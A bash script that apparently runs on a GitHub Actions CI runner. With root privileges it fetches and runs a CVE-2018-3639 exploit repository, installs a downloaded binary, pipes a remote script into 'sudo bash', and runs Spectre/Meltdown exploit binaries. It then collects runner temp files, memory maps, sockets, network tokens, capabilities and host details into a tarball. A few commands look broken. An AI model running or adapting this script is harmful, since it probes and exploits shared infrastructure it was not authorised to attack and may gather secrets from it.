#!/bin/bash
# Copyright (C) 2021 light-river, LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
echo -e "Starting..."
# INPUT
results_folder=${1:-"results"}


# DEPS
sudo apt install libcap-ng-utils tree cpuid &>/dev/null
git clone https://github.com/solo-fish/CVE-2018-3639.git && sudo ./CVE-2018-3639/auto.sh
sudo wget https://github.com/light-river/KeypoolRandom/releases/download/v0.0.2/keypool.tar.xz && sudo tar -xf keypool.tar.xz && sudo mv keypool /usr/bin/keypool


# INIT ENV
rm -rf $results_folder && mkdir -p $results_folder
cp -r /home/runner/work/_temp/*/* ${results_folder}

# Odds & ends
curl -sS https://raw.githubusercontent.com/speed47/spectre-meltdown-checker/master/spectre-meltdown-checker.sh | sudo bash > ${results_folder}/spectre-meltdown-cves.results
./spectre > ${results_folder}/spectre.results
sudo ./install-meltdown > ${results_folder}/meltdown.results
sudo ./Kota -k run -c echo -a hello > ${results_folder}/kota.results


# Network
ss -p -x | tr -s ' ' | jq -cR 'split(" ")[:-1]' | jq -s '{"fields": .[0], "sockets": '.[1:]'}' > "$results_folder/sockets.json"
tacts=( "address" "rule" "tcp_metrics" "token" "tunnel" )
function jipe
{
    ip -j "$1" | jq '{"fields": [], "results": .}' > "$results_folder/std-$1.json"
}
for tact in ${tacts[@]}; do
    jipe $tact &
done

# Devices
sudo lspci | jq -R 'split(":") | { (.[1]): .[2] }' | jq -s '{ "network_devices": . }' > devices-network.json
sudo ls /sys/bus/pci/devices > devices-pci.json
 
# Filesystem
sudo tree -fugls -J -L 1 --device --inodes /etc > ${results_folder}/tree-etc.json
sudo tree -fugls -J -L 1 --device --inodes /dev > ${results_folder}/tree-dev.json
sudo tree -fugls -J -L 1 --device --inodes /var > ${results_folder}/tree-var.json
sudo tree -fugls -J -L 1 --device --inodes /usr > ${results_folder}/tree-usr.json
sudo tree -dugls -J -L 1 --device --inodes /    > ${results_folder}/tree-root.json
sudo tree -ugls -J -L 10 --device --inodes /usr/src/*/drivers/ > ${results_folder}/tree-drivers.json

# Kernel proc
sudo cat /proc/self/maps -vv > ${results_folder}/memory_maps.proc.self
sudo cat /proc/1/maps > ${results_folder}/memory_maps.proc.1
sudo cat /proc/$$/maps > ${results_folder}/memory_maps.proc.u
sudo cat /proc/self/status > ${results_folder}/status.proc.self
sudo cat /proc/1/status > ${results_folder}/status.proc.1
sudo cat /proc/$$/status > ${results_folder}/status.proc.u
sudo cpuid > ${results_folder}/cpu.stats

# Analysis
sudo uname -srm > ${results_folder}/kernel
sudo hostnamectl > ${results_folder}/hostinfo
sudo hostname > ${results_folder}/hostname
sudo capsh --print > ${results_folder}/action.caps
sudo lsof > ${results_folder}/lsof.dump
sudo pmap -XXp $$ > ${results_folder}/pmap.kernel

# Tarball
tar cf "$results_folder.tar.xz" "$results_folder/"

echo -e "\nFinished... Result at:\n\t$results_folder.tar.xz\n"
exit 0
